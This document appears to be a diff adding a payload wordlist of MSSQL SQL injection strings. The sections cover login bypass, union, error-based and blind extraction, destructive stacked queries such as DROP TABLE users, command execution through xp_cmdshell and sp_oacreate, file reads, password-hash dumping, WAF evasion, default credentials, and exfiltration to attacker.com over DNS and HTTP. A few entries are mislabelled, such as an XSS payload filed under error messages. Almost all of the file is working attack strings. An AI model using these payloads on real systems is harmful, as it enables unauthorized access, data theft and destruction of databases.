@@ -1,0 +1,286 @@
+# MSSQL Injection Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: MSSQL SQL Injection
+
+# ============================================
+# MSSQL - AUTHENTICATION BYPASS
+# ============================================
+
+admin'--
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or 1=1--
+admin' or 'a'='a
+') or '1'='1--
+') or ('1'='1--
+
+# ============================================
+# MSSQL - UNION BASED
+# ============================================
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+
+' UNION SELECT @@version--
+' UNION SELECT user--
+' UNION SELECT db_name()--
+' UNION SELECT current_user--
+' UNION SELECT system_user--
+' UNION SELECT SUSER_SNAME()--
+' UNION SELECT host_name()--
+
+# ============================================
+# MSSQL - ERROR BASED
+# ============================================
+
+' AND 1=CONVERT(INT,(SELECT @@version))--
+' AND 1=CONVERT(INT,(SELECT db_name()))--
+' AND 1=CONVERT(INT,(SELECT top 1 table_name FROM information_schema.tables))--
+' AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.columns))--
+
+# ============================================
+# MSSQL - BLIND BOOLEAN
+# ============================================
+
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT 1)=1--
+' AND (SELECT 1)=2--
+
+# Time-based blind
+' AND 1=1; WAITFOR DELAY '00:00:10'--
+' AND 1=1; WAITFOR DELAY '00:00:05'--
+'; WAITFOR DELAY '00:00:10'--
+' AND 1=1; WAITFOR DELAY '0:0:10'--
+
+# ============================================
+# MSSQL - STACKED QUERIES
+# ============================================
+
+'; DROP TABLE users;--
+'; INSERT INTO users (username,password) VALUES ('admin','admin123');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM users;--
+'; CREATE TABLE test (id INT);--
+'; ALTER TABLE users DROP COLUMN password;--
+'; xp_cmdshell 'dir';--
+
+# ============================================
+# MSSQL - RCE VIA xp_cmdshell
+# ============================================
+
+# Enable xp_cmdshell
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+
+# Execute command
+'; EXEC xp_cmdshell 'whoami';--
+'; EXEC xp_cmdshell 'dir C:\';--
+'; EXEC xp_cmdshell 'net user';--
+
+# ============================================
+# MSSQL - RCE VIA sp_oacreate
+# ============================================
+
+'; DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell',@shell; EXEC sp_oamethod @shell,'run',null,'cmd /c whoami';--
+
+# ============================================
+# MSSQL - RCE VIA CLR
+# ============================================
+
+'; CREATE ASSEMBLY myAssembly FROM 'C:\windows\system32\my.dll' WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE myProc AS EXTERNAL NAME myAssembly.MyClass.MyMethod;--
+
+# ============================================
+# MSSQL - READ FILES
+# ============================================
+
+'; SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_BLOB) AS Contents--
+'; SELECT bulkcolumn FROM OPENROWSET(BULK '/etc/passwd', SINGLE_BLOB) AS b--
+
+# ============================================
+# MSSQL - WRITE FILES
+# ============================================
+
+';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'echo test > C:\test.txt';--
+
+# ============================================
+# MSSQL - INFORMATION_SCHEMA
+# ============================================
+
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT table_schema,table_name FROM information_schema.tables--
+
+# ============================================
+# MSSQL - VERSION
+# ============================================
+
+' UNION SELECT @@version--
+' UNION SELECT @@SERVERNAME--
+' UNION SELECT @@SERVICENAME--
+
+# ============================================
+# MSSQL - USERS
+# ============================================
+
+' UNION SELECT name FROM sysusers--
+' UNION SELECT name,password FROM sysxlogins--
+' UNION SELECT name,type_desc FROM sys.database_principals--
+
+# ============================================
+# MSSQL - DATABASES
+# ============================================
+
+' UNION SELECT name FROM sys.databases--
+' UNION SELECT db_name()--
+' UNION SELECT DB_NAME()--
+
+# ============================================
+# MSSQL - TABLES
+# ============================================
+
+' UNION SELECT name FROM sysobjects WHERE xtype='U'--
+' UNION SELECT table_name FROM information_schema.tables--
+
+# ============================================
+# MSSQL - COLUMNS
+# ============================================
+
+' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+
+# ============================================
+# MSSQL - STRING FUNCTIONS
+# ============================================
+
+' UNION SELECT CHAR(65)+CHAR(66)+CHAR(67)--
+' UNION SELECT ASCII('A')--
+' UNION SELECT SUBSTRING('test',1,1)--
+' UNION SELECT LEN('test')--
+
+# ============================================
+# MSSQL - PASSWORD HASH
+# ============================================
+
+' UNION SELECT password FROM sys.sql_logins--
+' UNION SELECT name,password_hash FROM sys.sql_logins--
+
+# ============================================
+# MSSQL - LINKED SERVERS
+# ============================================
+
+' UNION SELECT name FROM sys.servers--
+' UNION SELECT srvname FROM sys.sysservers--
+
+# ============================================
+# MSSQL - COMMENTS
+# ============================================
+
+-- Comment
+# Comment  
+/* Comment */
+
+# ============================================
+# MSSQL - BYPASS WAF
+# ============================================
+
+# Case variation
+AdMiN'--
+
+# Whitespace variation
+admin'/**/--
+admin'	--
+admin'%0a--
+
+# Double encoding
+admin%27--
+
+# Unicode
+admin%u0027--
+
+# ============================================
+# MSSQL - TIME-BASED RCE
+# ============================================
+
+' AND 1=1; WAITFOR DELAY '00:00:10'--
+' AND 1=1; WAITFOR DELAY '0:0:10'--
+'; WAITFOR DELAY '00:00:10'--
+
+# ============================================
+# MSSQL - PROCEDURES
+# ============================================
+
+' UNION SELECT name FROM sys.procedures--
+' UNION SELECT name,type FROM sys.objects WHERE type='P'--
+
+# ============================================
+# MSSQL - TRIGGERS
+# ============================================
+
+' UNION SELECT name FROM sys.triggers--
+' UNION SELECT name,object_definition(object_id) FROM sys.procedures--
+
+# ============================================
+# MSSQL - DEFAULT PASSWORDS
+# ============================================
+
+sa
+sa (blank)
+sa (password)
+admin
+admin123
+password
+
+# ============================================
+# MSSQL - ERROR MESSAGES
+# ============================================
+
+# Trigger error-based
+' AND 1=1;--><svg/onload=alert(1)>
+
+# Division by zero
+' AND 1=1/0--
+
+# ============================================
+# MSSQL - DNS EXFILTRATION
+# ============================================
+
+'; EXEC master..xp_cmdshell 'ping mydns.attacker.com';--
+'; DECLARE @url VARCHAR(500); SET @url='http://attacker.com/'+(SELECT TOP 1 table_name FROM information_schema.tables); EXEC sp_oacreate 'msxml2.xmlhttp',@url OUT; EXEC sp_oamethod @url,'open',NULL,'GET',@url; EXEC sp_oamethod @url,'send';--
+
+# ============================================
+# MSSQL - OPENROWSET
+# ============================================
+
+' UNION SELECT * FROM OPENQUERY((local), 'SELECT * FROM OPENROWSET(''SQLNCLI'', ''Server=attacker.com;Trusted_Connection=yes;'', ''SELECT * FROM users'')')--
+
+# ============================================
+# MSSQL - OPENDATASOURCE
+# ============================================
+
+' UNION SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=password').mydb.dbo.users--
+
+# ============================================
+# MSSQL - DBCC
+# ============================================
+
+'; DBCC CHECKDB ('master')--
+'; DBCC SHOWCONTIG--
+'; DBCC OPENTRAN--
+
+# ============================================
+# MSSQL - SYSTEM TABLES
+# ============================================
+
+' UNION SELECT * FROM sys.databases--
+' UNION SELECT * FROM sys.tables--
+' UNION SELECT * FROM sys.columns--
+' UNION SELECT * FROM sys.objects--
+
